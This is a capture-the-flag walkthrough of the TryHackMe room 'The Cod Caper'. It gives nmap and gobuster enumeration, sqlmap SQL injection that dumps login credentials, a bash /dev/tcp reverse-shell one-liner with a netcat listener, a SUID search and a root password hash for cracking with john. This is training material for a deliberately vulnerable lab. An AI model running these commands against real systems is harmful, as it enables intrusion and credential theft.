# 🐟 TryHackMe - The Cod Caper

## 🔎 Host Enumeration

The first step is to see what ports and services are running on the target machine.  

**Recommended Tool:** `nmap`  
**Useful Flags:** `-p -sC -A`  

To answer these questions, scan the machine with nmap and analyze the results.

```bash
nmap -A <IP> 
```
We can see two ports open:  
- 22 → ssh  
- 80 → http  

**Questions:**  
1. How many ports are open on the target machine? → `2`  
2. What is the http-title of the web server? → `Apache2 Ubuntu Default Page: It works`  
3. What version is the ssh service? → `OpenSSH 7.2p2 Ubuntu 4ubuntu2.8`  
4. What is the version of the web server? → `Apache/2.4.18`  

---

## 🌐 Web Enumeration

Since only SSH and Apache are running, let’s check the web server for possible vulnerabilities.  

**Recommended Tool:** `gobuster`  
**Useful Flags:** `-x --url --wordlist`  
**Wordlist:** `big.txt`  

If we open the IP in a browser, we see the default Apache2 Ubuntu page.  
Now let’s scan with gobuster to enumerate directories and files.

```bash
gobuster dir -u http://IP/ -w big.txt -x .php,.html,.txt
```
📌 We found an important file!  

**Question:**  
- What is the name of the important file on the server? → `administrator.php`  

---

## 💉 Web Exploitation

The admin page gives a login form. First check for low-hanging fruit like SQL Injection.  

**Recommended Tool:** `sqlmap`  
**Useful Flags:** `-u --forms --dump -a`  

On `IP/administrator.php`, we have an admin login form.  

```bash
sqlmap -u <url> --forms --dump
```
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

We found usernames and passwords!  

**Questions:**  
1. What is the admin username?  
2. What is the admin password?  
3. How many forms of SQLi is the form vulnerable to? → `3`  

---

## ⚡ Command Execution

With the credentials from sqlmap, we log in.  

We get another form.

Let’s try to get a reverse shell with **netcat**. First, prepare a PHP shell:  

```bash
bash -c 'exec bash -i &>/dev/tcp/<ip>/<port> <&1'
```

Run netcat on attacker machine:  

```bash
nc -lvnp <port>
```
If successful, we get access to the target:  

**Questions:**  
1. How many files are in the current directory? → `3`  
2. Do I still have an account? → `yes`  
3. What is my ssh password? → Path: `/var/hidden/pass`  

---

## 🔑 LinEnum

**Question:** What is the interesting path of the interesting SUID file?  `/opt/secret/root`
There is a user called pingu in `/home`
First connect via SSH  

```bash
ssh pingu@IP
```

To list all SUID binaries:  

```bash
find / -perm -u=s -type f 2>/dev/null
```


## 🛠 pwndbg

No answer needed.

---

## 🛠 Binary Exploitation (Manually)

No answer needed.

---

## 🛠 Binary Exploitation (Pwntools)

No answer needed.

---

## 🔓 Finishing the Job

Now that we have the password hashes, we can crack them to get the root password.  

Root hash:  

```
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
```

Usage with john:  

```bash
john [format] [wordlist] hash.txt
```
Escalation complete: You own this box.
---

## ✅ Conclusion

We exploited **The Cod Caper** using:  
- Enumeration (`nmap`, `gobuster`)  
- SQL Injection (`sqlmap`)  
- Command Execution (reverse shell)  
- Privilege Escalation (SUID, password cracking)  

🚩 Room Completed 🎉
```
